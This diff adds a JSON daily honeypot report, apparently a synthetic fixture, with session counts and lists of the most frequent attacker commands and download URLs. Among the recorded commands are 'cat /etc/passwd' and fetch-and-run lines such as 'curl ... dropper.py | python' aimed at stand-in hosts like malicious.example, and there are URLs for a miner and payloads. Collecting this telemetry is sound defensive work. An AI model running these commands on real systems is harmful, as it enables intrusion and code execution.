@@ -1,0 +1,58 @@
+{
+  "@timestamp": "2025-09-22T20:24:25.923569+00:00",
+  "generated_at": "2025-09-22T20:24:25.923569+00:00",
+  "report_type": "daily",
+  "date": "2025-09-22",
+  "sensor": "aggregate",
+  "sessions": {
+    "total": 1626,
+    "avg_commands": 4.0,
+    "max_commands": 4,
+    "min_commands": 4,
+    "file_downloads": 3252,
+    "login_attempts": 3252,
+    "vt_flagged": 0,
+    "dshield_flagged": 0,
+    "unique_ips": 200
+  },
+  "commands": {
+    "top": [
+      {
+        "command": "echo 'test' > /tmp/probe.txt",
+        "occurrences": 12147
+      },
+      {
+        "command": "uname -a",
+        "occurrences": 12051
+      },
+      {
+        "command": "cat /etc/passwd",
+        "occurrences": 12010
+      },
+      {
+        "command": "wget [URL]malicious.example/payload.sh",
+        "occurrences": 11921
+      },
+      {
+        "command": "curl -fsSL [URL]10.0.0.99/dropper.py [PIPE] python",
+        "occurrences": 11871
+      }
+    ]
+  },
+  "files": {
+    "top": [
+      {
+        "url": "http://10.0.0.42/scan.py",
+        "occurrences": 10050
+      },
+      {
+        "url": "http://malicious.example/miner.bin",
+        "occurrences": 9985
+      },
+      {
+        "url": "http://malicious.example/payload.sh",
+        "occurrences": 9965
+      }
+    ]
+  }
+}
